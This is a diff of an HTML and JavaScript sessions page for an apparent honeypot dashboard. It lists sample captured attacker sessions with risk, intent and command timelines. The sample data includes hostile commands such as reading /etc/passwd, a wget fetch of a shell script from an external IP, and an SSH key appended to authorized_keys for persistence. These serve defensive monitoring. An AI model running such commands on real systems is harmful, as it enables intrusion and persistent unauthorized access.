@@ -3,70 +3,378 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Sessions - EchidraOSS | Qyleron</title>
+  <title>Sessions - Echidra OSS | Qyleron</title>
   <link rel="icon" href="/assets/qyleron_logo.png" type="image/png" />
-  <style>
-    :root { color-scheme: dark; --bg: #000000; --surface: #0a0a0a; --surface-strong: #111111; --text: #ffffff; --muted: #999999; --line: #1f1f1f; --accent: #ffffff; --shadow: none; font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-    * { box-sizing: border-box; }
-    body { margin: 0; min-width: 320px; background: var(--bg); color: var(--text); }
-    body::before { content: ""; position: fixed; inset: 0; z-index: -1; opacity: 0.02; background-image: linear-gradient(90deg, #333 1px, transparent 1px), linear-gradient(#333 1px, transparent 1px); background-size: 50px 50px; }
-    .topbar { position: fixed; top: 0; left: 0; right: 0; z-index: 1000; height: 64px; display: flex; align-items: center; justify-content: space-between; padding: 0 24px; border-bottom: 1px solid var(--line); background: var(--surface); }
-    .brand-banner { display: block; width: clamp(112px, 16vw, 170px); height: 42px; object-fit: contain; object-position: left center; }
-    .product-name { color: var(--muted); font-size: 15px; font-weight: 650; white-space: nowrap; }
-    .navbar { position: fixed; top: 64px; left: 0; right: 0; z-index: 999; height: 52px; display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 0 24px; border-bottom: 1px solid var(--line); background: var(--surface); }
-    .nav-links, .navbar-actions { display: flex; align-items: center; gap: 4px; }
-    .navbar-actions { gap: 10px; margin-left: auto; }
-    .nav-link { display: inline-block; padding: 6px 14px; border-radius: 8px; color: var(--muted); text-decoration: none; font-size: 13px; font-weight: 650; }
-    .nav-link.active { color: var(--text); background: var(--surface-strong); }
-    .logout-button { min-height: 34px; border: 1px solid var(--line); border-radius: 8px; padding: 7px 10px; color: var(--muted); background: transparent; cursor: pointer; font: inherit; font-size: 13px; }
-    .content { min-height: calc(100vh - 116px); margin-top: 116px; padding: 20px 24px 40px; }
-    .inner { width: min(1400px, 100%); margin: 0 auto; display: grid; gap: 18px; }
-    .panel { border: 1px solid var(--line); border-radius: 8px; background: var(--surface); }
-    .panel-header { padding: 14px 16px; border-bottom: 1px solid var(--line); }
-    .panel-title { margin: 0; font-size: 15px; font-weight: 750; }
-    .panel-body { padding: 16px; color: var(--muted); }
-    table { width: 100%; border-collapse: collapse; table-layout: fixed; }
-    th, td { padding: 11px 12px; border-bottom: 1px solid var(--line); text-align: left; font-size: 13px; }
-    th { color: var(--muted); background: var(--surface-strong); }
-    @media (max-width: 768px) { .topbar, .navbar { padding-inline: 16px; } .nav-links { overflow-x: auto; } .navbar-actions { margin-left: 0; } .content { padding-inline: 16px; } }
-  </style>
+  <link rel="stylesheet" href="/dashboard.css" />
 </head>
 <body>
-  <header class="topbar">
-    <img class="brand-banner" src="/assets/Qyleron_Banner.png" alt="Qyleron" />
-    <div class="product-name">EchidraOSS</div>
-  </header>
-  <nav class="navbar" aria-label="Primary dashboard navigation">
-    <div class="nav-links">
-      <a class="nav-link" href="/dashboard">Overview</a>
-      <a class="nav-link active" href="/dashboard/sessions">Sessions</a>
-      <a class="nav-link" href="/dashboard/intelligence">Intelligence</a>
-      <a class="nav-link" href="/dashboard/personas">Personas</a>
-      <a class="nav-link" href="/dashboard/alerts">Alerts</a>
-      <a class="nav-link" href="/dashboard/reports">Reports</a>
-    </div>
-    <div class="navbar-actions">
+  <div class="app-shell">
+    <header class="topbar">
+      <a href="/" class="logo" aria-label="Qyleron home">
+        <img src="/assets/Qyleron_Banner.png" alt="Qyleron" />
+      </a>
+      <div class="product-name">Echidra OSS</div>
+    </header>
+
+    <nav class="navbar" aria-label="Primary dashboard navigation">
+      <div class="nav-links">
+        <a class="nav-link" href="/dashboard">Overview</a>
+        <a class="nav-link active" href="/dashboard/sessions">Sessions</a>
+        <a class="nav-link" href="/dashboard/analytics">Analytics</a>
+        <a class="nav-link" href="/dashboard/intelligence">Intelligence</a>
+        <a class="nav-link" href="/dashboard/personas">Personas</a>
+      </div>
       <button id="logoutButton" class="logout-button" type="button">Logout</button>
-    </div>
-  </nav>
-  <main class="content">
-    <div class="inner">
-      <section class="panel">
-        <div class="panel-header"><h1 class="panel-title">Sessions</h1></div>
-        <div class="panel-body">
-          <table>
-            <thead><tr><th>Session</th><th>Actor</th><th>Risk</th><th>Status</th></tr></thead>
-            <tbody><tr><td colspan="4">Session exploration view is ready for the next data pass.</td></tr></tbody>
+    </nav>
+
+    <main class="dashboard-main">
+      <section class="page-panel" aria-labelledby="sessionsTitle">
+        <div class="page-panel-header">
+          <div class="page-panel-title">
+            <h1 id="sessionsTitle">Captured Attacker Sessions</h1>
+          </div>
+          <div class="page-panel-actions">
+            <div class="time-range-control">
+              <button id="timeRangeButton" class="text-button" type="button">Loading range...</button>
+              <div id="timeRangePanel" class="time-range-panel">
+                <div class="time-range-row">
+                  <div class="time-range-group">
+                    <label for="rangeFromDate">From date</label>
+                    <input type="date" id="rangeFromDate" />
+                  </div>
+                  <div class="time-range-group">
+                    <label for="rangeFromHour">From hour</label>
+                    <select id="rangeFromHour"></select>
+                  </div>
+                </div>
+                <div class="time-range-row">
+                  <div class="time-range-group">
+                    <label for="rangeToDate">To date</label>
+                    <input type="date" id="rangeToDate" />
+                  </div>
+                  <div class="time-range-group">
+                    <label for="rangeToHour">To hour</label>
+                    <select id="rangeToHour"></select>
+                  </div>
+                </div>
+                <div class="time-range-actions">
+                  <button id="applyRangeButton" class="text-button" type="button">Apply</button>
+                </div>
+              </div>
+            </div>
+            <button id="downloadVisibleButton" class="text-button" type="button">Download CSV Report</button>
+          </div>
+        </div>
+
+        <div class="table-shell">
+          <table class="data-table" aria-describedby="sessionsTitle">
+            <thead>
+              <tr>
+                <th>Time</th>
+                <th>Source IP</th>
+                <th>Country</th>
+                <th>Persona</th>
+                <th>Protocol</th>
+                <th>Risk</th>
+                <th>Intent</th>
+              </tr>
+            </thead>
+            <tbody id="sessionsTableBody"></tbody>
           </table>
         </div>
       </section>
-    </div>
-  </main>
+    </main>
+  </div>
+
   <script>
-    document.getElementById("logoutButton").addEventListener("click", async () => {
-      await fetch("/auth/logout", { method: "POST" });
-      window.location.assign("/auth");
+    const sessions = [
+      {
+        id: "sess-1048",
+        timestamp: new Date("2026-06-24T14:12:00"),
+        sourceIp: "185.234.219.x",
+        country: "Russia",
+        persona: "Ubuntu Web Server",
+        protocol: "SSH",
+        risk: "high",
+        intent: "Credential Access",
+        duration: "4m 18s",
+        commands: ["whoami", "id", "uname -a", "cat /etc/passwd", "wget http://185.234.219.x/a.sh"],
+        evidence: ["Admin-like username attempts", "Sensitive file read", "External payload fetch attempt"],
+        note: "Single-session report keeps raw behavior here; cross-session weakness trends belong on Intelligence."
+      },
+      {
+        id: "sess-1047",
+        timestamp: new Date("2026-06-24T13:58:00"),
+        sourceIp: "103.77.166.x",
+        country: "China",
+        persona: "Debian Mail Gateway",
+        protocol: "SSH",
+        risk: "medium",
+        intent: "Reconnaissance",
+        duration: "1m 42s",
+        commands: ["pwd", "ls -la", "cat /etc/issue", "netstat -tulpn"],
+        evidence: ["System fingerprinting", "Network service discovery"],
+        note: "This session shows discovery behavior without confirmed payload staging."
+      },
+      {
+        id: "sess-1046",
+        timestamp: new Date("2026-06-23T13:41:00"),
+        sourceIp: "198.199.103.x",
+        country: "USA",
+        persona: "Generic Linux Shell",
+        protocol: "SSH",
+        risk: "low",
+        intent: "Scanner Validation",
+        duration: "24s",
+        commands: ["echo test", "exit"],
+        evidence: ["Short command sequence", "Clean logout"],
+        note: "Likely automated validation with no meaningful post-login activity."
+      },
+      {
+        id: "sess-1045",
+        timestamp: new Date("2026-06-22T12:37:00"),
+        sourceIp: "177.54.144.x",
+        country: "Brazil",
+        persona: "CentOS Database",
+        protocol: "SSH",
+        risk: "high",
+        intent: "Persistence Setup",
+        duration: "6m 03s",
+        commands: ["whoami", "crontab -l", "mkdir -p ~/.ssh", "echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys"],
+        evidence: ["Persistence path touched", "SSH key insertion attempt"],
+        note: "The report should preserve evidence for this session, while Intelligence later turns repeated patterns into fixes."
+      }
+    ];
+
+    const NOW = new Date("2026-06-24T23:59:00");
+    const tableBody = document.getElementById("sessionsTableBody");
+    let visibleSessions = sessions;
+
+    function formatSessionTime(date) {
+      const day = String(date.getDate()).padStart(2, "0");
+      const month = String(date.getMonth() + 1).padStart(2, "0");
+      const year = String(date.getFullYear()).slice(-2);
+      const hour24 = date.getHours();
+      const period = hour24 < 12 ? "AM" : "PM";
+      const hour12 = String(hour24 % 12 === 0 ? 12 : hour24 % 12).padStart(2, "0");
+      const minutes = String(date.getMinutes()).padStart(2, "0");
+      return `${day}/${month}/${year} ${hour12}:${minutes} ${period}`;
+    }
+
+    function localDateKey(date) {
+      const year = date.getFullYear();
+      const month = String(date.getMonth() + 1).padStart(2, "0");
+      const day = String(date.getDate()).padStart(2, "0");
+      return `${year}-${month}-${day}`;
+    }
+
+    function renderSessions(sessionsToRender) {
+      if (sessionsToRender.length === 0) {
+        tableBody.innerHTML = `<tr><td colspan="7" class="empty-state" style="text-align: center;">No sessions in this range.</td></tr>`;
+        return;
+      }
+      tableBody.innerHTML = sessionsToRender.map((session) => `
+        <tr data-session-row="${session.id}" tabindex="0" aria-expanded="false">
+          <td>
+            <div class="cell-primary">
+              <strong>${formatSessionTime(session.timestamp)}</strong>
+              <span>${session.duration}</span>
+            </div>
+          </td>
+          <td class="mono-cell">${session.sourceIp}</td>
+          <td>${session.country}</td>
+          <td>
+            <div class="cell-primary">
+              <strong>${session.persona}</strong>
+              <span>${session.id}</span>
+            </div>
+          </td>
+          <td>${session.protocol}</td>
+          <td><span class="risk-badge ${session.risk}">${session.risk}</span></td>
+          <td>${session.intent}</td>
+        </tr>
+      `).join("");
+    }
+
+    function toggleSession(sessionId) {
+      const row = document.querySelector(`[data-session-row="${sessionId}"]`);
+      const existingDetail = document.getElementById(`${sessionId}-detail`);
+      document.querySelectorAll(".session-detail-row").forEach((detail) => detail.remove());
+      document.querySelectorAll("[data-session-row]").forEach((sessionRow) => {
+        sessionRow.classList.remove("selected");
+        sessionRow.setAttribute("aria-expanded", "false");
+      });
+
+      if (existingDetail) {
+        return;
+      }
+
+      const session = sessions.find((item) => item.id === sessionId);
+      row.classList.add("selected");
+      row.setAttribute("aria-expanded", "true");
+      row.insertAdjacentHTML("afterend", `
+        <tr id="${session.id}-detail" class="session-detail-row">
+          <td colspan="7">
+            <div class="session-detail">
+              <section class="detail-block" aria-label="Session evidence">
+                <h3>Evidence</h3>
+                <ul class="detail-list">
+                  ${session.evidence.map((item) => `<li>${item}</li>`).join("")}
+                </ul>
+              </section>
+              <section class="detail-block" aria-label="Command timeline">
+                <h3>Command Timeline</h3>
+                <ul class="command-list">
+                  ${session.commands.map((command) => `<li>${command}</li>`).join("")}
+                </ul>
+              </section>
+              <section class="detail-block" aria-label="Session note">
+                <h3>POC Boundary</h3>
+                <p>${session.note}</p>
+              </section>
+            </div>
+          </td>
+        </tr>
+      `);
+    }
+
+    function downloadCsv(filename, rows) {
+      const csv = rows.map((row) => row.map((value) => `"${String(value).replaceAll('"', '""')}"`).join(",")).join("\n");
+      const blob = new Blob([csv], { type: "text/csv;charset=utf-8" });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = filename;
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+      URL.revokeObjectURL(url);
+    }
+
+    tableBody.addEventListener("click", (event) => {
+      const row = event.target.closest("[data-session-row]");
+      if (row) {
+        toggleSession(row.dataset.sessionRow);
+      }
     });
+
+    tableBody.addEventListener("keydown", (event) => {
+      if (event.key !== "Enter" && event.key !== " ") {
+        return;
+      }
+      const row = event.target.closest("[data-session-row]");
+      if (row) {
+        event.preventDefault();
+        toggleSession(row.dataset.sessionRow);
+      }
+    });
+
+    document.getElementById("downloadVisibleButton").addEventListener("click", () => {
+      const rows = [
+        ["Time", "Source IP", "Country", "Persona", "Protocol", "Risk", "Intent"],
+        ...visibleSessions.map((session) => [
+          formatSessionTime(session.timestamp),
+          session.sourceIp,
+          session.country,
+          session.persona,
+          session.protocol,
+          session.risk,
+          session.intent
+        ])
+      ];
+      downloadCsv("echidra-sessions-visible.csv", rows);
+    });
+
+    const HOUR_OPTIONS = Array.from({ length: 24 }, (_, hour) => {
+      const period = hour < 12 ? "AM" : "PM";
+      const displayHour = hour % 12 === 0 ? 12 : hour % 12;
+      return { hour, label: `${displayHour} ${period}` };
+    });
+
+    function populateHourSelect(select, defaultHour) {
+      select.innerHTML = HOUR_OPTIONS.map(({ hour, label }) => `<option value="${hour}">${label}</option>`).join("");
+      select.value = String(defaultHour);
+    }
+
+    function formatRangeLabel(from, to) {
+      const fmt = (date) => date.toLocaleDateString("en-GB", { day: "2-digit", month: "short" });
+      return `${fmt(from)} – ${fmt(to)}`;
+    }
+
+    function readRange() {
+      const fromDate = document.getElementById("rangeFromDate").value;
+      const fromHour = Number(document.getElementById("rangeFromHour").value);
+      const toDate = document.getElementById("rangeToDate").value;
+      const toHour = Number(document.getElementById("rangeToHour").value);
+
+      const from = new Date(`${fromDate}T00:00:00`);
+      from.setHours(fromHour, 0, 0, 0);
+
+      const to = new Date(`${toDate}T00:00:00`);
+      to.setHours(toHour, 59, 59, 999);
+
+      return { from, to };
+    }
+
+    function applyRange() {
+      const { from, to } = readRange();
+      visibleSessions = sessions.filter((session) => session.timestamp >= from && session.timestamp <= to);
+      renderSessions(visibleSessions);
+      document.getElementById("timeRangeButton").textContent = formatRangeLabel(from, to);
+    }
+
+    function initTimeRangeControl() {
+      const fromDateInput = document.getElementById("rangeFromDate");
+      const toDateInput = document.getElementById("rangeToDate");
+      const fromHourSelect = document.getElementById("rangeFromHour");
+      const toHourSelect = document.getElementById("rangeToHour");
+      const timeRangeButton = document.getElementById("timeRangeButton");
+      const timeRangePanel = document.getElementById("timeRangePanel");
+
+      populateHourSelect(fromHourSelect, 0);
+      populateHourSelect(toHourSelect, 23);
+      toDateInput.value = localDateKey(NOW);
+      const defaultFrom = new Date(NOW);
+      defaultFrom.setDate(defaultFrom.getDate() - 6);
+      fromDateInput.value = localDateKey(defaultFrom);
+
+      timeRangeButton.addEventListener("click", (event) => {
+        event.stopPropagation();
+        timeRangePanel.classList.toggle("open");
+      });
+
+      document.getElementById("applyRangeButton").addEventListener("click", () => {
+        applyRange();
+        timeRangePanel.classList.remove("open");
+      });
+
+      document.addEventListener("click", (event) => {
+        if (!event.target.closest(".time-range-control")) {
+          timeRangePanel.classList.remove("open");
+        }
+      });
+
+      document.addEventListener("keydown", (event) => {
+        if (event.key === "Escape") {
+          timeRangePanel.classList.remove("open");
+        }
+      });
+
+      applyRange();
+    }
+
+    async function logoutDashboard() {
+      const logoutButton = document.getElementById("logoutButton");
+      logoutButton.disabled = true;
+      try {
+        await fetch("/auth/logout", { method: "POST" });
+      } finally {
+        window.location.assign("/auth");
+      }
+    }
+
+    document.getElementById("logoutButton").addEventListener("click", logoutDashboard);
+    initTimeRangeControl();
   </script>
 </body>
 </html>
